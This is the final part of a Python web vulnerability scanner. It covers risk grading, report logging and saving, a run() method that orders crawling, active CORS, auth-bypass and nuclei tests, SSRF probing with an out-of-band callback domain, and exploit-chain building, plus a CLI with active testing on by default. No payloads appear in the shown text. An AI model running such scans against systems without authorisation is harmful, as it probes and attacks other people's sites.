        grade_map = [(9.0, "F"), (7.5, "D"), (5.0, "C"), (3.0, "B"), (1.0, "A"), (0, "A+")]
        grade = next(g for thresh, g in grade_map if overall_risk >= thresh)

        self.findings["summary"] = {
            "scanner_version":          self.VERSION,
            "domain":                   self.domain,
            "scan_date":                datetime.now(timezone.utc).isoformat(),
            "scan_duration_seconds":    round(duration, 2),
            "pages_per_second":         round(self.crawled_pages / duration, 2) if duration > 0 else 0,
            "total_urls_crawled":       len(self.visited_urls),
            "total_js_files":           len(self.js_files),
            "total_api_endpoints":      len(self.api_endpoints),
            "detected_waf":             self._detected_waf or "None",
            "detected_technologies":    self._tech_fingerprint,
            # Secrets
            "secrets_total":            len(secs),
            "secrets_critical":         sum(1 for s in secs if s["severity"] == "Critical"),
            "secrets_high":             sum(1 for s in secs if s["severity"] == "High"),
            # JS vulns
            "js_vulns_total":           len(jsv),
            "js_vulns_high":            sum(1 for v in jsv if v.get("severity") == "High"),
            "taint_flows_found":        sum(1 for v in jsv if "Taint" in v.get("type", "")),
            # SSRF
            "ssrf_total":               len(ssrf),
            "ssrf_confirmed":           sum(1 for v in ssrf if v.get("confirmed")),
            # Active
            "active_vulns_total":       len(active),
            "active_critical":          sum(1 for a in active if a.get("severity") == "Critical"),
            "active_high":              sum(1 for a in active if a.get("severity") == "High"),
            "sqli_found":               sum(1 for a in active if "SQL" in a.get("type", "")),
            "xss_found":                sum(1 for a in active if "XSS" in a.get("type", "")),
            "ssti_found":               sum(1 for a in active if "SSTI" in a.get("type", "")),
            "cors_issues":              sum(1 for a in active if "CORS" in a.get("type", "")),
            "auth_bypass_found":        sum(1 for a in active if "403 Bypass" in a.get("type", "")),
            # Misc
            "security_header_issues":   len(hdrs),
            "exposed_endpoints_total":  len(exp),
            "exposed_critical":         sum(1 for e in exp if e.get("severity") == "Critical"),
            "exploit_chains_built":     len(chains),
            # Risk
            "overall_risk_score":       overall_risk,
            "security_grade":           grade,
            "scan_host":                socket.gethostname(),
            "platform":                 platform.system(),
        }

    def _log_summary(self):
        s = self.findings["summary"]
        self.logger.info("=" * 60)
        self.logger.info(f"  SCAN COMPLETE — {self.domain}  [{s['security_grade']}] risk={s['overall_risk_score']}/10")
        self.logger.info(f"  Pages    : {s['total_urls_crawled']}  JS: {s['total_js_files']}  APIs: {s['total_api_endpoints']}")
        self.logger.info(f"  WAF      : {s['detected_waf']}")
        self.logger.info(f"  Secrets  : {s['secrets_total']} ({s['secrets_critical']} crit / {s['secrets_high']} high)")
        self.logger.info(f"  JS Vulns : {s['js_vulns_total']} ({s['js_vulns_high']} high, {s['taint_flows_found']} taint flows)")
        self.logger.info(f"  Active   : {s['active_vulns_total']} ({s['active_critical']} crit) — SQLi:{s['sqli_found']} XSS:{s['xss_found']} SSTI:{s['ssti_found']} CORS:{s['cors_issues']} 403bp:{s['auth_bypass_found']}")
        self.logger.info(f"  SSRF     : {s['ssrf_total']} ({s['ssrf_confirmed']} confirmed)")
        self.logger.info(f"  Exposed  : {s['exposed_endpoints_total']} ({s['exposed_critical']} critical)")
        self.logger.info(f"  Chains   : {s['exploit_chains_built']} exploit chain(s) built")
        self.logger.info(f"  Headers  : {s['security_header_issues']} issues")
        self.logger.info(f"  Time     : {s['scan_duration_seconds']}s  @  {s['pages_per_second']} p/s")
        self.logger.info("=" * 60)

    def _save_findings(self) -> str:
        ts   = datetime.now().strftime("%Y%m%d-%H%M%S")
        path = os.path.join(self.output_dir, f"scan_{self.domain_netloc}_{ts}.json")
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(self.findings, f, indent=2, ensure_ascii=False)
            self.logger.info(f"Findings → {path}")
        except Exception as e:
            self.logger.error(f"Save error: {e}")
        return path

    def _save_state(self):
        try:
            with open(self._state_file, "w") as f:
                json.dump({"visited_urls": list(self.visited_urls)}, f)
        except Exception as e:
            self.logger.debug(f"State save: {e}")

    def _load_state(self):
        if not os.path.exists(self._state_file): return
        try:
            with open(self._state_file) as f:
                state = json.load(f)
            self.visited_urls = set(state.get("visited_urls", []))
            self.logger.info(f"[RESUME] {len(self.visited_urls)} URLs loaded")
        except Exception as e:
            self.logger.warning(f"State load: {e}")

    # ──────────────────────────────────────────────────────────────────────
    # PUBLIC ENTRY POINT
    # ──────────────────────────────────────────────────────────────────────

    def run(self) -> Dict:
        try:
            # L1 — Passive crawl
            start = self.crawl_website()

            # L2 — Active testing
            if self.active_scan:
                self.logger.info("[L2] Starting active security tests…")
                self._scan_sensitive_paths()
                self._test_cors()
                self._test_auth_bypass()
                self._run_nuclei()

            # L1 — SSRF endpoint probing
            if self.api_endpoints:
                self.logger.info(f"[L1] SSRF probing {len(self.api_endpoints)} endpoints…")
                with ThreadPoolExecutor(max_workers=min(self.max_workers, 10)) as ex:
                    list(ex.map(self._probe_endpoint_ssrf, list(self.api_endpoints)))

            # L4 — Headless browser
            if self.headless:
                self._run_headless_scan()
                # Add dynamic routes to crawl
                for route in self._dynamic_routes:
                    if route not in self.visited_urls:
                        self._process_url(route, 0, queue.Queue())

            # L5 — Exploit chains
            self._build_exploit_chains()

            # Finalize
            duration = time.monotonic() - start
            self._build_summary(duration)
            self._save_findings()
            self._save_state()
            self._log_summary()
            return self.findings

        except Exception as e:
            import traceback
            self.logger.error(f"Fatal: {e}\n{traceback.format_exc()}")
            return {"error": str(e), "domain": self.domain}


# ═══════════════════════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    p = argparse.ArgumentParser(
        description=f"Advanced Content Scanner {AdvancedContentScanner.VERSION} — Nirvana Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  python advanced_content_scanner.py example.com\n"
               "  python advanced_content_scanner.py example.com --active --headless --nuclei /usr/bin/nuclei\n"
               "  python advanced_content_scanner.py example.com --depth 4 --pages 500 --oob-domain xxx.interact.sh",
    )
    p.add_argument("domain")
    p.add_argument("--depth",         type=int,   default=3)
    p.add_argument("--pages",         type=int,   default=200)
    p.add_argument("--workers",       type=int,   default=15)
    p.add_argument("--rate",          type=float, default=0.15)
    p.add_argument("--no-ssl-verify", action="store_true")
    p.add_argument("--log-level",     default="INFO")
    p.add_argument("--log-file",      default=None)
    p.add_argument("--output-dir",    default=None)
    p.add_argument("--oob-domain",    default=None)
    p.add_argument("--subdomains",    action="store_true")
    p.add_argument("--resume",        action="store_true")
    p.add_argument("--min-severity",  default="Low")
    p.add_argument("--active",        action="store_true", default=True, help="Enable active testing (default: on)")
    p.add_argument("--no-active",     dest="active", action="store_false")
    p.add_argument("--nuclei",        default=None, help="Path to nuclei binary")
    p.add_argument("--headless",      action="store_true", help="Enable Playwright headless browser (requires: pip install playwright && playwright install chromium)")
    p.add_argument("--no-fuzz",       dest="fuzz", action="store_false", default=True)
    p.add_argument("--no-chains",     dest="chains", action="store_false", default=True)
    args = p.parse_args()

    scanner = AdvancedContentScanner(
        domain              = args.domain,
        max_depth           = args.depth,
        max_pages           = args.pages,
        max_workers         = args.workers,
        rate_limit          = args.rate,
        verify_ssl          = not args.no_ssl_verify,
        log_level           = args.log_level,
        log_file            = args.log_file,
        output_dir          = args.output_dir,
        oob_callback_domain = args.oob_domain,
        include_subdomains  = args.subdomains,
        resume              = args.resume,
        min_severity        = args.min_severity,
        active_scan         = args.active,
        nuclei_path         = args.nuclei,
        fuzz_forms          = args.fuzz,
        headless            = args.headless,
        build_exploit_chains= args.chains,
    )
    results = scanner.run()
    sys.exit(0 if "error" not in results else 1)
